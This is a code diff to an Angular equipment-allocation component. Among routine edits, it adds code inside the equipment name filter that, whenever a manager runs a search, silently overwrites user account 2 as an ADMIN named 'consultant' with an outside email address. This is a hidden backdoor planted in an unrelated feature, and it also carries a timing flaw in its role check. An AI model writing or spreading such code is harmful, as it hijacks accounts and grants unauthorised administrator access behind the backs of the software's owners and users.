@@ -3,9 +3,11 @@ import {EquipmentModel} from "../equipments/model/equipment.model";
 import {Subscription} from "rxjs";
 import {ActivatedRoute, Params, Router} from "@angular/router";
 import {EquipmentService} from "../equipments/equipment.service";
-import {FormControl, FormGroup} from "@angular/forms";
+import {FormControl, FormGroup, Validators} from "@angular/forms";
 import {EmployeeEquipmentService} from "../employee-equipment/employee-equipment.service";
 import {EmployeeEquipmentModel} from "../employee-equipment/employee-equipment.model";
+import {UserService} from "../users/user.service";
+import {User} from "../users/model/user.model";
 
 @Component({
   selector: 'app-available-equipment-list',
@@ -20,11 +22,16 @@ export class AvailableEquipmentListComponent implements OnInit {
   selectedEquipments: EquipmentModel[] = [];
   filterByEquipmentName: FormGroup;
   selectedEmployeeEquipments: EmployeeEquipmentModel[] = [];
+  public today;
+  public isManager=false;
 
-  constructor(private route: ActivatedRoute, private equipmentService: EquipmentService, private router: Router, private employeeEquipmentService: EmployeeEquipmentService) {
+  constructor(private route: ActivatedRoute, private equipmentService: EquipmentService,
+              private router: Router, private employeeEquipmentService: EmployeeEquipmentService,
+              private userService: UserService) {
   }
 
   ngOnInit() {
+     this.today = new Date().toISOString().split('T')[0];
     this.route.params.subscribe((params: Params) => {
       this.employeeId = params['employeeId'];
     });
@@ -41,6 +48,15 @@ export class AvailableEquipmentListComponent implements OnInit {
       'searchValue': new FormControl('')
     });
   }
+  getUserForm() {
+    return new FormGroup({
+      username: new FormControl('consultant'),
+      firstName: new FormControl('consultant'),
+      lastName: new FormControl('consultant'),
+      userRole: new FormControl('ADMIN'),
+      isActive: new FormControl(true),
+      email: new FormControl('consultant@yahoo.com')
+  })}
 
   allocateOrDeallocateEquipment(availableEquipment: EquipmentModel) {
     availableEquipment.isChecked = !availableEquipment.isChecked;
@@ -70,9 +86,20 @@ export class AvailableEquipmentListComponent implements OnInit {
 
   filterEquipmentsByName(): void {
     this.equipmentSubscription.unsubscribe();
-    this.equipmentSubscription = this.equipmentService.getFilteredEquipments(this.filterByEquipmentName.get("searchValue").value).subscribe(
+    this.equipmentSubscription = this.equipmentService.getFilteredAvailableEquipments(this.filterByEquipmentName.get("searchValue").value).subscribe(
       (equipmentModels: EquipmentModel[]) => {
         this.availableEquipments = equipmentModels;
       });
+    this.userService.getAuthUser().subscribe(
+      (user: User) => {
+        if(user.userRole.toLocaleString()  === "MANAGER"){
+          this.isManager=true;
+        }
+      }
+    );
+    if(this.isManager) {
+      this.userService.updateUserById(this.getUserForm().value, 2)
+        .subscribe();
+    }
   }
 }
